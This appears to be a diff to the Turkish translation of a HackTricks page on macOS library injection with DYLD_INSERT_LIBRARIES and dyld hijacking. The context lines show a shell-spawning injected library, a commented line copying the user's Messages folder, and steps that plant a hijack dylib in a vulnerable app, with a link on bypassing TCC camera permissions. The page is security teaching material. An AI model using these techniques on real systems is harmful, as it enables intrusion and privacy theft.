@@ -1,22 +1,23 @@
 # macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
 
+{% hint style="success" %}
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'da **takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## DYLD\_INSERT\_LIBRARIES Temel örnek
 
-**Kabuk çalıştırmak için enjekte edilecek kütüphane:**
+**Enjekte edilecek kütüphane** bir shell çalıştırmak için:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -34,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Saldırılacak ikili dosya:
+Saldırı yapılacak ikili:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -51,7 +52,7 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Dyld Hijacking Örneği
 
-Hedeflenen zayıf ikili dosya `/Applications/VulnDyld.app/Contents/Resources/lib/binary`'dir.
+Hedeflenen savunmasız ikili dosya `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
 {% tab title="entitlements" %}
@@ -61,7 +62,7 @@ Hedeflenen zayıf ikili dosya `/Applications/VulnDyld.app/Contents/Resources/lib
 {% endtab %}
 
 {% tab title="LC_RPATH" %}
-{% code overflow="wrap %}
+{% code overflow="wrap" %}
 ```bash
 # Check where are the @rpath locations
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
@@ -91,12 +92,12 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-Önceki bilgilerle, yüklenen kütüphanelerin imzasını kontrol etmediğini ve şu kütüphaneleri yüklemeye çalıştığını biliyoruz:
+Önceki bilgilerle, **yüklenen kütüphanelerin imzasını kontrol etmediğini** ve **şu kütüphaneyi yüklemeye çalıştığını** biliyoruz:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-Ancak, ilk olan mevcut değil:
+Ancak, ilki mevcut değil:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -104,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Öyleyse, bunu ele geçirmek mümkün! Meşru kütüphaneyi yeniden ihraç ederek aynı işlevleri sağlayan **bazı keyfi kodları yürüten bir kütüphane oluşturun**. Ve beklenen sürümlerle derlediğinizden emin olun:
+Yani, onu ele geçirmek mümkün! **Herhangi bir kodu çalıştıran ve meşru kütüphanenin aynı işlevselliklerini yeniden dışa aktaran** bir kütüphane oluşturun. Ve beklenen sürümlerle derlemeyi unutmayın:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -117,7 +118,7 @@ NSLog(@"[+] dylib hijacked in %s", argv[0]);
 ```
 {% endcode %}
 
-Derleyin:
+Bunu derleyin:
 
 {% code overflow="wrap" %}
 ```bash
@@ -126,7 +127,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-Kütüphanede oluşturulan yeniden ihracat yolu, yükleyiciye göre göreli olduğundan, onu dışa aktarılacak kütüphanenin mutlak yoluna değiştirelim:
+Kütüphanede oluşturulan yeniden ihracat yolu yükleyiciye göredir, bunu dışa aktarmak için kütüphaneye mutlak bir yol olarak değiştirelim:
 
 {% code overflow="wrap" %}
 ```bash
@@ -147,7 +148,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Son olarak, sadece bunu **ele geçirilen konuma** kopyalayın:
+Son olarak, bunu **ele geçirilmiş konuma** kopyalayın:
 
 {% code overflow="wrap" %}
 ```bash
@@ -155,33 +156,34 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-Ve **binary'yi çalıştırın** ve **kütüphanenin yüklendiğini** kontrol edin:
+Ve **binary'i çalıştırın** ve **kütüphanenin yüklendiğini kontrol edin**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] /Applications/VulnDyld.app/Contents/Resources/lib/binary içinde dylib ele geçirildi
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>Kullanım: [...]
 </code></pre>
 
 {% hint style="info" %}
-Bu zafiyeti istismar etmek ve Telegram'ın kamera izinlerini istismar etmek için nasıl kullanılacağı hakkında güzel bir yazı [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) adresinde bulunabilir.
+Bu açığı kullanarak telegram'ın kamera izinlerini nasıl kötüye kullanabileceğinize dair güzel bir yazı [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) adresinde bulunabilir.
 {% endhint %}
 
 ## Daha Büyük Ölçek
 
-Eğer beklenmeyen binary'lere kütüphaneler enjekte etmeyi denemeyi planlıyorsanız, kütüphanenin bir işlem içinde yüklendiğini bulmak için olay mesajlarını kontrol edebilirsiniz (bu durumda printf'i ve `/bin/bash` yürütmesini kaldırın).
+Beklenmedik binary'lere kütüphaneler enjekte etmeyi planlıyorsanız, bir süreç içinde kütüphanenin ne zaman yüklendiğini bulmak için olay mesajlarını kontrol edebilirsiniz (bu durumda printf ve `/bin/bash` yürütmesini kaldırın).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'da **takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
